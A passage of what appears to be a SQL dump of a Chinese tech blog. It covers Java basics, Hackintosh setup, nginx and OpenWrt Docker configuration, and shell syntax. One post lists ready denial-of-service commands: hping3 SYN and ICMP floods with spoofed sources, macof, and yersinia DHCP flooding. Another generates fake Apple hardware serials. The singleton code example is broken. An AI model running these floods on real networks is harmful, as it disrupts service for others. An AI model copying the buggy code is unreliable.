Apples(\"红色\" , 2.8);   // 打印结果：[color= 红色 weight= 2.8 ]\n\n\n\nSystem.out.println(sta1);\n\n\n	}\n\n}\n```\n\n### ▲equals() 方法\n\n   == 判断两个引用变量时，要求两个变量指向同一个对象才返回 true 。\n\n   Object 提供的 equals() 方法，判断两个引用变量相等的标准，与 == 的判断标准完全一样。\n\n   如果要判断两个对象是否相等，很多时候应该使用 equals 。—— 此时必须要重写equals() 方法：重写该方法，就要告诉系统，两个对象相等的业务标准。\n\n```\n	@Override\n// 重写 equals方法， 固定写法。\npublic boolean equals(Object obj) {\n    if(this == obj) {   // 判断this 和obj 是否指向同一对象\n        return true;\n    }\n    if(obj != null && obj.getClass() == Apples.class) { // 判断obj是否为空，且两个对象的类型是否相同\n        Apples temp = (Apples) obj;  // 强转，固定写法\n        return this.color.equals(temp.color) \n                && this.weight == temp.weight;\n    }\n  \n    return false;\n}\n\n}\n```\n','/articles/2020/05/28/1590661424556.html','0',1590661424608,1590661424608,0.9248785402161225,'1','','https://img.hacpai.com/bing/20190910.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0),('1590754642414','Java中的 static 和 单例模式','\n','static 关键字 ▲ static 在这里并不代表静态。static 是类，有 static 的成员属于类成员，没有static 的成员属于实例成员。   static 是否可以修饰局部变量 —— 局部变量不属于成员，因此不能用 static修饰。   static 能否修饰外部类 —— 外部类不属于成员，因此不能用 static 修饰 。   static 可修饰的成员： ▲ static 成员（成员变量、方法、初始化块、内部类） —— 属于类变量。 【扩展】笔试题中，如果遇到使用对象来调用类成员的情形，先把对象改成类。 ▲ static 考点（笔试较常见）。   —— static 成员不能访问非 static 成员。非 static 成员可以访问 static 成员！ public class 面试题1 { int age = 20; public static void main(String[] args) { System.out.println(age); // 无法从静态上下文中引用非静态 变量 age } }  public class 面试题2 { public....','java','1584497886024','![](https://img.hacpai.com/bing/20180316.jpg?imageView2/1/w/960/h/540/interlace/1/q/100)\n\n## static 关键字\n▲ static 在这里并不代表静态。static 是类，有 static 的成员属于类成员，没有static 的成员属于实例成员。\n\n\n&ensp; static 是否可以修饰局部变量 —— 局部变量不属于成员，因此不能用 static修饰。\n\n&ensp; static 能否修饰外部类 —— 外部类不属于成员，因此不能用 static 修饰 。\n\n&ensp;  static 可修饰的成员：\n\n\n▲ static 成员（成员变量、方法、初始化块、内部类） —— 属于类变量。\n\n【扩展】笔试题中，如果遇到使用对象来调用类成员的情形，先把对象改成类。\n\n▲ static 考点（笔试较常见）。\n\n&ensp;  —— static 成员不能访问非 static 成员。非 static 成员可以访问 static 成员！ \n\n~~~\npublic class 面试题1 {\n\n\n	int age = 20;\n\npublic static void main(String[] args) {\n    System.out.println(age);    // 无法从静态上下文中引用非静态 变量 age\n	}\n\n}\n~~~\n\n~~~\npublic class 面试题2 {\n\n	public  void sta1() {\n   		 System.out.println(\"这是一个方法\");\n}\n\n	public static void main(String[] args) { // 无法从静态上下文中引用非静态 方法 sta1()\n   	 	sta1();\n	}\n\n}\n~~~\n\n~~~\npublic class 面试题4 {\n\n\n	int a =2;\n\n	static int b = a;\n\n}\n~~~\n\n\n~~~\npublic class 面试题3 {\n	int age ;\n\nstatic {\n   	 age =3;\n	}\n\n}\n~~~\n\n~~~\n\npublic class 面试题5 {\n\n\n	public void sta1() {\n   		 System.out.println(\"sta1的方法\");\n	}\n\n	static {\n    		sta1();\n		}\n	}\n~~~\n\n\n## 单例模式\n\n\n▲ 单例模式 ：在某些场景下，某些类只需要（只能）创建一个实例。比如系统的窗口管理器，数据库引擎访问点……都只产生一个实例。此时就应该采用单例模式。\n\n▲ 如何设计单例模式？\n\n\n&ensp;（1）、隐藏构造器 —— 避免被创建实例。\n\n&ensp;（2）、暴露一个 static 方法，该方法用于创建实例，该方法还需要保证，该类只产生一个实例。\n\n~~~\n// 单例模式\nclass pear {\n\n	static pear st;\n\n	// 隐藏构造器\n	private pear() {\n}\n\n// 暴露一个 static 方法，用于创建。\n	public static pear sta1() {\n		if (st == null) { // 判断是否创建实例。\n\n			pear a = new pear();\n				}\n		return st;\n			}\n		}\n\npublic class danli{\n\n	public static void main(String[] args) {\n		pear s1 = pear.sta1();\n		pear s2 = pear.sta1();\n\n    System.out.println(s1 == s2);   // true 可以看出 s1 和 s2 指向同一个对象。\n	}\n\n\n}\n~~~\n','/articles/2020/05/29/1590754642414.html','0',1590754642465,1590754642465,0.011544534502061388,'1','','https://img.hacpai.com/bing/20180316.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0),('1593141403765','联想小新AIR 15IKBR安装黑苹果','\n','本人安装黑苹果一路坎坷。今天简单介绍一下我安装黑苹果的经历。我用的是18款联想小新AIR 15IKBR ，安装黑苹果最重要的就是 EFI就是引导文件。安装之前我逛遍远近论坛都没有找到相对应的EFI文件。    我的EFI文件还需要感谢百度贴吧的一位贴友。这款EFI 不能说百分百完美。但是已经很不错了。缺点：无线网不能驱动，触控板不能用，隔空投送用不了，其他还在尝试。不过蓝牙能用，显卡只有集显可以驱动，但是基本能用。 EFI 文件找到后仍然没有安装成功。每次在摸盘或者在安装过程中卡住然后重启报五国。  本来都打算放弃了，后来在 “电报” 的一个黑果群里得到解答。问题出在硬盘。这款电脑的硬盘是三星PM981这款电脑不支持安装黑苹果。所以我就从淘宝购了一款固态。 准备工作：一个16GU盘、  操作系统、刻录工具、EFI文件  安装步骤很简单。 首先用 balenaEtcher 刻录工具将系统刻录进U盘，然后用 DiskGenius 工具将U盘中的 EFI 跟换成自己电脑型号相对应的EFI 。最后就像安装 windows 一样就可以正常使用了，安装过程中需要等待的时间有点长请耐心等待。','黑苹果','1584497886024','![](https://b3logfile.com/bing/20190920.jpg?imageView2/1/w/960/h/540/interlace/1/q/100)\n\n本人安装黑苹果一路坎坷。今天简单介绍一下我安装黑苹果的经历。我用的是18款联想小新AIR 15IKBR ，安装黑苹果最重要的就是 EFI就是引导文件。安装之前我逛遍*远近论坛*都没有找到相对应的EFI文件。\n\n```\n```\n\n![heiguo1.png](https://b3logfile.com/file/2020/06/heiguo1-a0cc4153.png) \n\n我的EFI文件还需要感谢百度贴吧的一位贴友。这款EFI 不能说百分百完美。但是已经很不错了。缺点：无线网不能驱动，触控板不能用，隔空投送用不了，其他还在尝试。不过蓝牙能用，显卡只有集显可以驱动，但是基本能用。\n\nEFI 文件找到后仍然没有安装成功。每次在摸盘或者在安装过程中卡住然后重启报五国。\n\n![IMG20200615201159.jpg](https://b3logfile.com/file/2020/06/IMG20200615201159-c7c399c3.jpg)\n\n本来都打算放弃了，后来在 “电报” 的一个黑果群里得到解答。问题出在硬盘。这款电脑的硬盘是三星PM981这款电脑不支持安装黑苹果。所以我就从淘宝购了一款固态。\n\n准备工作：一个16GU盘、\n\n* [操作系统](https://mirrors.dtops.cc/iso/MacOS/daliansky_macos/)、刻录工具、EFI文件\n\n安装步骤很简单。\n\n首先用 balenaEtcher 刻录工具将系统刻录进U盘，然后用 DiskGenius 工具将U盘中的 EFI 跟换成自己电脑型号相对应的EFI 。最后就像安装 windows 一样就可以正常使用了，安装过程中需要等待的时间有点长请耐心等待。\n','/articles/2020/06/26/1593141403765.html','0',1593141403867,1593141403867,0.8573537542838279,'1','','https://b3logfile.com/bing/20190920.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0),('1596879620431','黑苹果三码洗白','\n',' 很多人安装黑苹果之后，遇到很多各种问题。最近我的黑果就出现Facetime、iMessages不能使用。问度娘是因为三码的问题。下面我就说一下我的解决方法。  首先下载Clover Configurator，安装就不说了。我安装的是中文版的，点击找到自己黑苹果的磁盘，点击挂载分区。   打开分区找到 clover 下的config.plist用Clover Configurator打开。找到机型设置，选择与自己相近的配置。    在机型设置中的Sysetm选项点击生成新的，这个会自动随机生成新的序列号。然后点击检查覆盖范围。会自动打开苹果官网的保障服务，输入验证码如果序列号无效，就说明这个号可以使用。大部分都会出现无效，如果出现保障时间，或者过保的情况就说明该序列号被别人使用（不建议使用）。建议重新生成新的序列号，进行查找。    然后选择左侧的系统参数，生成新的UUID。  $ensp;最后点击左侧的变量设置，生成ROM，然后将MLB复制一下。保存一下配置，三码洗白就结束了，重启电脑就可以了。   不过我三码洗白后，Facetime、iMessages还是不能激活。是因为账号的问题....','黑苹果','1584497886024','![](https://b3logfile.com/bing/20181211.jpg?imageView2/1/w/960/h/540/interlace/1/q/100)\n\n 很多人安装黑苹果之后，遇到很多各种问题。最近我的黑果就出现Facetime、iMessages不能使用。问度娘是因为三码的问题。下面我就说一下我的解决方法。\n\n 首先下载Clover Configurator，安装就不说了。我安装的是中文版的，点击找到自己黑苹果的磁盘，点击挂载分区。\n\n![image20200808170734992.png](https://b3logfile.com/file/2020/08/image20200808170734992-db4cd50c.png)\n\n 打开分区找到 clover 下的config.plist用Clover Configurator打开。找到机型设置，选择与自己相近的配置。\n![image20200808162251529.png](https://b3logfile.com/file/2020/08/image20200808162251529-2975ae26.png)\n\n![image20200808162401308.png](https://b3logfile.com/file/2020/08/image20200808162401308-85b5a20b.png)\n\n 在机型设置中的Sysetm选项点击生成新的，这个会自动随机生成新的序列号。然后点击检查覆盖范围。会自动打开苹果官网的保障服务，输入验证码如果序列号无效，就说明这个号可以使用。大部分都会出现无效，如果出现保障时间，或者过保的情况就说明该序列号被别人使用（不建议使用）。建议重新生成新的序列号，进行查找。\n![image20200808164243374.png](https://b3logfile.com/file/2020/08/image20200808164243374-83caae30.png)\n\n![image20200808163949772.png](https://b3logfile.com/file/2020/08/image20200808163949772-3182488c.png)\n\n 然后选择左侧的系统参数，生成新的UUID。\n\n![image20200808164741013.png](https://b3logfile.com/file/2020/08/image20200808164741013-a69f7ab8.png)\n\n$ensp;最后点击左侧的变量设置，生成ROM，然后将MLB复制一下。保存一下配置，三码洗白就结束了，重启电脑就可以了。\n\n![image20200808165510623.png](https://b3logfile.com/file/2020/08/image20200808165510623-b7531ecc.png)\n\n 不过我三码洗白后，Facetime、iMessages还是不能激活。是因为账号的问题，最后我直接联系苹果客服 ，不能怂。客服服务特别好，别说你的是黑苹果，他会找你要你的序列号，不用担心直接给他就行了。\n','/articles/2020/08/08/1596879620431.html','0',1596879620483,1596879620483,0.000017529905304458637,'1','','https://b3logfile.com/bing/20181211.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0),('1602479623711','solo博客nginx配置https踩坑','\n','solo博客目前用的人还挺多。搭建方式可以用docker方式搭建，比较方便。最近想将nginx配置在docker外面实现https协议。nginx配置完总出现静态文件加载不出来。  通过百度了解可能为 跨域请求被浏览器拦截 后来想起来，问题出现在solo搭建的时候采用的是最简搭建。因该应https的方法搭建。用下面的命令重新运行就可以了。 sudo docker run -v /opt/lib/mariadb-java-client-2.6.0.jar:/opt/solo/lib/mariadb-java-client-2.6.0.jar \\ --detach --name solo --network=host \\ --env RUNTIME_DB=\"MYSQL\" \\ --env JDBC_USERNAME=\"solo\" \\ --env JDBC_PASSWORD=\"123456\" \\ --env JDBC_DRIVER=\"org.mariadb.jdbc.Driver\" \\ --env JDBC_URL=\"jdbc:mariadb://127.0.0.1:3306/solo?use....','solo','1584497886024','solo博客目前用的人还挺多。搭建方式可以用docker方式搭建，比较方便。最近想将nginx配置在docker外面实现https协议。nginx配置完总出现静态文件加载不出来。\n\n![nginx坑.png](https://b3logfile.com/file/2020/10/nginx坑-c7dd6d37.png)\n\n通过百度了解可能为  **跨域请求被浏览器拦截**   后来想起来，问题出现在solo搭建的时候采用的是最简搭建。因该应https的方法搭建。用下面的命令重新运行就可以了。\n\n```\nsudo docker run -v /opt/lib/mariadb-java-client-2.6.0.jar:/opt/solo/lib/mariadb-java-client-2.6.0.jar \\\n    --detach --name solo --network=host \\\n    --env RUNTIME_DB=\"MYSQL\" \\\n    --env JDBC_USERNAME=\"solo\" \\\n    --env JDBC_PASSWORD=\"123456\" \\\n    --env JDBC_DRIVER=\"org.mariadb.jdbc.Driver\" \\\n    --env JDBC_URL=\"jdbc:mariadb://127.0.0.1:3306/solo?useUnicode=yes&characterEncoding=UTF-8&useSSL=false&serverTimezone=UTC&allowPublicKeyRetrieval=true\" \\\n    b3log/solo --listen_port=8080 --server_scheme=https --server_host=goofiest.top --server_port=\n```\n\nnginx的配置如下：\n\n```\n###########  solo 博客 ###########\n\n#upstream backend {\n#        server localhost:8080;\n#}\n\nserver {\n    listen       443;\n    server_name  localhost;\n    ssl on;\n    ssl_certificate /dockerData//nginx/ssl/public.pem;\n    ssl_certificate_key /dockerData//nginx/ssl/public.key;\n    ssl_session_timeout 5m;\n    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;\n    ssl_prefer_server_ciphers on;\n\n    #charset koi8-r;\n    #access_log  /var/log/nginx/host.access.log  main;\n\n    location / {\n\n       proxy_pass http://goofiest.top:8080;\n       proxy_set_header  Host $http_host;\n       proxy_set_header  X-Real-IP  $remote_addr;\n       client_max_body_size  10m;\n    }\n\n    #error_page  404              /404.html;\n\n    # redirect server error pages to the static page /50x.html\n    #\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n        root   /usr/share/nginx/html;\n    }\n}\nserver{\n  listen 80;\n  server_name goofiest.top;\n  rewrite ^(.*) https://$host$1 permanent;\n}\n```\n\n','/articles/2020/10/12/1602479623711.html','0',1602479623814,1602479623814,0.9978175698722236,'1','','https://b3logfile.com/file/2020/10/nginx坑-c7dd6d37.png?imageView2/2/w/1280/format/jpg/interlace/1/q/100',0),('1603520839239','Docker运行OpenWrt','\n','&nbsp;&nbsp;最近在某鱼上整了一款低功耗小主机，打算做旁路由。op 系统比较适合做旁路由，但是只做一个op个人感觉有点奢侈。所以今天我打算将op运行在docker里面。外面还可以搭建各种服务，同时docker还可以同时运行各种其他系统。 &nbsp;&nbsp;现在我将记录我的部分操作，以后再次搭建一目了然。 镜像来源第三方下载，也可以自己找源码进行编译。我嫌麻烦所以就直接下载别人编译好的。 操作步骤： &nbsp;&nbsp;我的小主机安装的是Ubuntu18操作系统。 1、打开网卡混杂模式 sudo ip link set enp1s0 promisc on  这里的 enp1s0 是你的网卡。 2 、创建网络 sudo docker network create -d macvlan --subnet=192.168.1.0/24 --gateway=192.168.1.1 -o parent= enp1s0 macnet  这里的192.168.1.0/24就是里的路由器所在的网段，192.168.1.1是你的路由器网关。这条命令运行之后可以使用 docker net....','OpenWrt','1584497886024','![](https://b3logfile.com/bing/20190624.jpg?imageView2/1/w/960/h/540/interlace/1/q/100)\n\n&nbsp;&nbsp;最近在某鱼上整了一款低功耗小主机，打算做旁路由。op 系统比较适合做旁路由，但是只做一个op个人感觉有点奢侈。所以今天我打算将op运行在docker里面。外面还可以搭建各种服务，同时docker还可以同时运行各种其他系统。\n\n&nbsp;&nbsp;现在我将记录我的部分操作，以后再次搭建一目了然。\n[镜像来源](https://down.ssrc.win/Router/LEDE/x86_64/Lean)第三方下载，也可以自己找源码进行编译。我嫌麻烦所以就直接下载别人编译好的。\n\n### 操作步骤：\n\n&nbsp;&nbsp;我的小主机安装的是Ubuntu18操作系统。\n\n#### 1、打开网卡混杂模式\n\n```\nsudo ip link set enp1s0 promisc on\n```\n\n这里的 enp1s0 是你的网卡。\n\n#### 2 、创建网络\n\n```\nsudo docker network create -d macvlan --subnet=192.168.1.0/24 --gateway=192.168.1.1 -o parent=  enp1s0 macnet\n```\n\n这里的192.168.1.0/24就是里的路由器所在的网段，192.168.1.1是你的路由器网关。这条命令运行之后可以使用 docker network ls 查看网络情况。\n\n```\n~|⇒ sudo docker network ls\nNETWORK ID          NAME                DRIVER              SCOPE\ncc823342f2a7        bridge              bridge              local\n321340f71e7c        host                host                local\naa72a74607ff        macnet              macvlan             local\n1d2eeeef0288        none                null                local\n```\n\n#### 3、导入镜像\n\n由于我的镜像是从第三方下载的所以导入到docker容器中运行。\n\n##### *将下载好的镜像解压：*\n\n```\nsudo  gunzip openwrt-x86-64-generic-ext4-rootfs.img.gz\n```\n\n##### *将解压好的文件挂载在一个空目录下：*\n\n```\nsudo mount openwrt-x86-64-generic-ext4-rootfs.img ./sta1\n```\n\n可以查看一下目录下面的内容：\n\n```\nsta1|⇒ ls\nbin  dev  dockerd.init  etc  lib  lib64  lost+found  mnt  opt  overlay  proc  rom  root  sbin  sys  tmp  usr  var  www\n```\n\n##### *将目录下的所有文件打包：*\n\n```\ntar -cvf ~/openwrt *\n```\n\n##### *最后将打包过后的文件导入docker中：*\n\n```\n~|⇒ sudo docker import openwrt op\nsha256:35e1c3d7ba65943501d8b556fec660a89e2f68cc688d32fb61bf4abf6437c923\n```\n\n可以看见docker中存在OpenWrt镜像：\n\n```\n~|⇒ sudo docker images\nREPOSITORY               TAG                 IMAGE ID            CREATED             SIZE\nop                       latest              35e1c3d7ba65        12 seconds ago      479MB\n```\n\n#### 4、创建并启动容器：\n\n```\ndocker run --name op -d --network macnet --privileged=true op /sbin/init\n```\n\n```\n~|⇒ sudo docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED              STATUS              PORTS               NAMES\ne2c7a76a9fbc        op                  \"/sbin/init\"        About a minute ago   Up About a minute                       op\n```\n\n可以看出op已经正常运行了！不过这还没结束！！！\n\n#### 5、进入容器修改网络参数：\n\n```\n~|⇒ sudo docker exec -it op bash\n```\n\n```\nbash-5.0# vi /etc/config/network\n```\n\n个人习惯将 IP 改为 DHCP 然后去网页端更改静态:\n\n```\nconfig interface \'loopback\'\n        option ifname \'lo\'\n        option proto \'static\'\n        option ipaddr \'127.0.0.1\'\n        option netmask \'255.0.0.0\'\n\nconfig globals \'globals\'\n        option ula_prefix \'fd9d:15b4:2e0c::/48\'\n        option packet_steering \'1\'\n\nconfig interface \'lan\'\n        option type \'bridge\'\n        option ifname \'eth0\'\n        option proto \'dhcp\'\n#       option ipaddr \'10.0.0.1\'\n#       option netmask \'255.255.255.0\'\n#       option ip6assign \'60\'\n\nconfig interface \'vpn0\'\n        option ifname \'tun0\'\n        option proto \'none\'\n```\n\n#### 6、重启网络：\n\n```\n/etc/init.d/network restart\n```\n\n#### 7、进入控制页面：\n\n先查看IP，通过ip地址进入控制页面\n\n```\nbash-5.0# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default\n    link/ether 02:42:53:2b:29:8a brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n       valid_lft forever preferred_lft forever\n4: br-lan: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000\n    link/ether 02:42:c0:a8:01:02 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.1.101/24 brd 192.168.1.255 scope global br-lan\n       valid_lft forever preferred_lft forever\n10: eth0@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-lan state UP group default\n    link/ether 02:42:c0:a8:01:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n```\n\n![op.png](https://b3logfile.com/file/2020/10/op-f5aae3e7.png)\n\n&nbsp;&nbsp;登录密码为 password ，进入管理页面后进行配置就可以使用了。具体操作可以以参考[最美应用](https://mlapp.cn/376.html)本篇文章也是参考最美应用进行修改。\n','/articles/2020/10/24/1603520839239.html','0',1603520839291,1603520839291,0.015121847079964557,'1','','https://b3logfile.com/bing/20190624.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0),('1603858210093','kali 简单操作','\n','简单介绍。 什么是DDOS攻击？   DDOS 全称 Distributed Denial of Service， 中文意思为“分布式拒绝服务”，就是利用大量合法的分布式服务器对目标发送请求，从而导致正常合法用户无法获得服务。 kali 基础攻击  Kali 是一个基于 Debian 的 Linux 发行版 ，它自带很多渗透工具， 包括nmap 、Wireshark 、hping3 等等。 1、tcp攻击（flood攻击）   原理：就是让 kali 做为客户端，目标 PC 作为服务端，kali 客户端发送大量的 tcp 报文，正常情况下客户端收到服务端的报文之后，需要回复。然而 Kali 服务器收到不在进行回包，让目的 PC 处于半链接状态。此时 PC 收不到回包就会再次发送回复。  命令：hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood -- --rand-source 192.168.1.1   参数介绍   -c(count)表示要发送的数据包的数量 -d(data size)发送数据包的大小 -S（SYN）SYN数据包 -w表示TCP的....','kali','1584497886024','![](https://b3logfile.com/bing/20180318.jpg?imageView2/1/w/960/h/540/interlace/1/q/100)\n\n### 简单介绍。\n\n#### 什么是DDOS攻击？\n\n&emsp; DDOS 全称 Distributed Denial of Service， 中文意思为“分布式拒绝服务”，就是利用大量合法的分布式服务器对目标发送请求，从而导致正常合法用户无法获得服务。\n\n### kali 基础攻击\n\n&emsp;Kali 是一个基于 Debian 的 Linux 发行版 ，它自带很多渗透工具， 包括nmap 、Wireshark 、hping3 等等。\n\n#### 1、tcp攻击（flood攻击）\n\n&emsp; 原理：就是让 kali 做为客户端，目标 PC 作为服务端，kali 客户端发送大量的 tcp 报文，正常情况下客户端收到服务端的报文之后，需要回复。然而 Kali 服务器收到不在进行回包，让目的 PC 处于半链接状态。此时 PC 收不到回包就会再次发送回复。\n\n&emsp;命令：hping3  -c 1000 -d 120 -S -w 64 -p 80 --flood -- --rand-source  192.168.1.1\n\n| 参数 | 介绍 |\n| --- | --- |\n| -c(count) | 表示要发送的数据包的数量 |\n| -d(data size) | 发送数据包的大小 |\n| -S（SYN） | SYN数据包 |\n| -w | 表示TCP的窗口大小 |\n| -p | 端口 |\n| --flood | 洪水攻击模式 |\n| --rand-source | 表示设定随机的源地址 |\n| 192.168.1.1 | 需要攻击的 IP 或 域名 |\n\n#### 2、MAC flood（攻击）\n\n  原理：直接攻击交换机，给交换机发送大量的 MAC 地址，让交换机处于一个瘫痪状态（不能连上网），注： 有的 kali  没有这个命令。\n\n  命令： macof\n\n#### 3、DHCP flood 泛洪攻击\n\n  发送大量的 Discovery 包（包括IP ，MAC 地址）广播报文，让 DHCP 服务器处于一个瘫痪状态，DHCP 服务器不在正常工作，将整个网络资源耗尽。\n\n  命令：yersinia -G 	&emsp;  **注:** -G 图形化界面。\n\n#### 4、icmp flood 攻击\n\n  原理： 发送大量的 ping 包，让服务器瘫痪。\n\n  命令： hping3 --icmp --rand-source --flood -d 目标IP\n\n| 参数 | 介绍 |\n| --- | --- |\n| --icmp | 攻击方式 |\n| --rand-source | 发起攻击的 IP 地址随机（虚拟地址） |\n| -d | 报文的大小（一般 ping 包最大是1500字节） |\n\n#### 5、cc攻击（web 压力测试）\n\n  模拟多用户多线程请求，较为耗 cpu 内存的 url\n\n  命令：ab -n 100000 -c 1000 url\n\n详细介绍可以访问([https://www.cnblogs.com/hello-py/articles/12767796.html](https://www.cnblogs.com/hello-py/articles/12767796.html))\n\n[扩展](https://man.linuxde.net/hping3)：有感兴趣的可以了解一下。\n\n**注意！** 该命令只适用于学习了解一下，请勿非法使用！\n\n','/articles/2020/10/28/1603858210093.html','0',1603858210195,1604849931047,0.9181403742210469,'1','','https://b3logfile.com/bing/20180318.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0),('1604897129295','shell 基础语法','\n','shell 中的变量 常用系统变量 $HOME——家目录 $PWD ——当前目录 $SHELL ——默认解释器 $USER —— 当前用户 set 显示当前Shell中所有变量。 自定义变量  定义变量：变量=值注意！ 等号左右没有空格。  public@DESKTOP-EKBL96L:~$ STA=6 public@DESKTOP-EKBL96L:~$ echo $STA 6 public@DESKTOP-EKBL96L:~$   撤销变量：unset 变量  public@DESKTOP-EKBL96L:~$ unset STA public@DESKTOP-EKBL96L:~$ echo $STA public@DESKTOP-EKBL96L:~$   声明静态变量：readonly 变量注意！ 不能用 unset 撤销，不能改变值  public@DESKTOP-EKBL96L:~$ readonly A=3 public@DESKTOP-EKBL96L:~$ echo $A 3 public@DESKTOP-EKBL96L:~$ unset A -bash: unset: A....','shell','1584497886024','![](https://b3logfile.com/bing/20180406.jpg?imageView2/1/w/960/h/540/interlace/1/q/100)\n\n## shell 中的变量\n\n#### 常用系统变量\n\n$HOME——家目录\n\n$PWD ——当前目录\n\n$SHELL ——默认解释器\n\n$USER —— 当前用户\n\nset 显示当前Shell中所有变量。\n\n#### 自定义变量\n\n1. 定义变量：变量=值**注意！** 等号左右没有空格。\n\n~~~shell\npublic@DESKTOP-EKBL96L:~$ STA=6\npublic@DESKTOP-EKBL96L:~$ echo $STA\n6\npublic@DESKTOP-EKBL96L:~$\n~~~\n\n2. 撤销变量：unset 变量\n\n~~~shell\npublic@DESKTOP-EKBL96L:~$ unset STA\npublic@DESKTOP-EKBL96L:~$ echo $STA\n\npublic@DESKTOP-EKBL96L:~$\n~~~\n\n3. 声明静态变量：readonly 变量**注意！** 不能用 unset 撤销，不能改变值\n\n~~~shell\npublic@DESKTOP-EKBL96L:~$ readonly A=3\npublic@DESKTOP-EKBL96L:~$ echo $A\n3\npublic@DESKTOP-EKBL96L:~$ unset A\n-bash: unset: A: cannot unset: readonly variable\n~~~\n\n#### 变量定义规则\n\n（1）变量名称可以由字母、数字和下划线组成，但是不能以数字开头，环境变量名建议大写。\n\n（2）等号两侧不能有空格。\n\n（3）在bash中，变量默认类型都是字符串类型，无法直接进行数值计算。\n\n（4）变量的值如果有空格，需要使用双引号或单引号括起来。\n\n#### 特殊变量\n\n1. $n	(功能描述：n 为数字，$0 代表该脚本名称，$1-$9 代表第一个到第九个参数，十以上的参数需要用大括号包含，如${10})\n\n~~~shell\n#!/bin/bash\necho \"$0 $1 $2 $3\"\n\npublic@DESKTOP-EKBL96L:~$ ./sta.sh sta1 sta2 sta3\n./sta.sh sta1 sta2 sta3\n~~~\n\n2. $#	(功能描述：获取所有输入参数个数，常用于循环)。\n\n~~~shell\n#!/bin/bash\necho $0\necho $1\necho $2\necho $#\n\npublic@DESKTOP-EKBL96L:~$ ./sta.sh 1 2 3 4 5 6 7 8 9\n./sta.sh\n1\n2\n9\npublic@DESKTOP-EKBL96L:~$=\n~~~\n\n3. $* 、 $@\n\n$*（功能描述：这个变量代表命令行中所有的参数，但是它把所有的参数看成一个整体）。\n\n$@（功能描述：这个变量也代表命令行中的所有参数，不过它把每个参数区分对待）。\n\n~~~shell\n#!/bin/bash\necho $*\necho $@\n\npublic@DESKTOP-EKBL96L:~$ ./sta.sh sta1 sta2\nsta1 sta2\nsta1 sta2\n~~~\n\n4. $?（功能描述：最后一次执行的命令的返回状态，如果这个变量的值为0，证明上一个命令正确执行；如果这个变量的值为非0，则证明上一个命令执行不正确）。\n\n~~~shell\npublic@DESKTOP-EKBL96L:~$ ./sta.sh sta1 sya1	# 该命令正确执行\nsta1 sya1\nsta1 sya1\npublic@DESKTOP-EKBL96L:~$ echo $?\n0\n~~~\n\n~~~shell\npublic@DESKTOP-EKBL96L:~$ ./sta.shswq sta1 sya1	 # 该命令不能正常执行\n-bash: ./sta.shswq: No such file or directory\npublic@DESKTOP-EKBL96L:~$ echo $?\n127\n~~~\n\n## 运算符\n\n~~~shell\n（1）“$((运算式))” 或 “$[运算式]”\n\n（2）expr + ，- ， \\* , /, % 	# 加 减 乘 除 取余\n~~~\n\n~~~shell\npublic@DESKTOP-EKBL96L:~$ expr `expr 3 + 3` \\* 2	# (3+3)*2=12\n12\n~~~\n\n## 条件判断\n\n#### 1、基础语法\n\n[ condition ] （注意 condition 前后要有空格）\n\n<font size =4 color = red>注意！</font>条件非空即为true，[ abc ]返回 true ，[  ]返回 false 。\n\n#### 2、常用判断条件\n\n> 两个整数之间比较：\n\n| --- | --- |\n| - | - |\n| -lt | 小于（less than） |\n| -le | 小于等于（less equal） |\n| -eq | 等于（equal） |\n| -gt | 大于（greater than） |\n| -ge | 大于等于（greater equal） |\n| -ne | 不等于（Not equal） |\n\n(1) &ensp; 23 是否大于等于 22\n\n~~~shell\npublic@DESKTOP-EKBL96L:~$ [ 23 -ge 22 ]\npublic@DESKTOP-EKBL96L:~$ echo $?	# 判断上一条命令是否正确\n0\n~~~\n\n(2)&ensp; 3 是否大于 5\n\n~~~shell\npublic@DESKTOP-EKBL96L:~$ [ 3 -gt 5 ]\npublic@DESKTOP-EKBL96L:~$ echo $?\n1\n~~~\n\n> 按照文件权限进行判断\n\n| --- | --- |\n| - | - |\n| -r | 有读的权限（read） |\n| -w | 有写的权限（write） |\n| -x | 有执行的权限（execute） |\n\n(1)&ensp; 判断该文件是否有读的权限:\n\n~~~shell\npublic@DESKTOP-EKBL96L:~$ ls\nsta.sh  whm\npublic@DESKTOP-EKBL96L:~$ [ -r sta.sh ]\npublic@DESKTOP-EKBL96L:~$ echo $?\n0\n~~~\n\n(2)&ensp; 判断 /home/ftps 文件夹是否有写的权限:\n\n~~~shell\npublic@DESKTOP-EKBL96L:/home$ [ -w /home/ftps ]\npublic@DESKTOP-EKBL96L:/home$ echo $?\n1\n~~~\n\n> 按照文件类型进行判断\n\n| --- | --- |\n| - | - |\n| -f | 文件存在并且是一个常规的文件 (file) |\n| -e | 文件存在 (existence) |\n| -d | 文件存在并是一个目录 (directory) |\n\n(1)&ensp; 判断 /home/ftps 文件是否存在并且是一个常规文件.\n\n~~~shell\npublic@DESKTOP-EKBL96L:/home$ [ -f /home/ftps ]		# ftps 是一个文件夹\npublic@DESKTOP-EKBL96L:/home$ echo $?\n1\n~~~\n\n(2) 判断 /home/ftps 文件是否存在并且是一个目录.\n\n~~~shell\npublic@DESKTOP-EKBL96L:/home$ [ -d /home/ftps 